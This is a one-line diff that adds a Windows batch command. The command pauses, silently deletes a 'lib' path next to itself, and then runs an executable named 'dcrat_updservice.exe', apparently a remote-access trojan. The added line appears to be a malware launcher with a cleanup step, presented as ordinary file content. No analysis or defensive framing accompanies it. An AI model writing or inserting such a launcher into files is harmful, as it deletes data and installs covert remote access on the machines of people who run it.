@@ -1,0 +1,1 @@
+@echo off & TIMEOUT /T 3 /NOBREAK>nul & del /Q "%~dp0/lib" & "%~dp0/dcrat_updservice.exe"
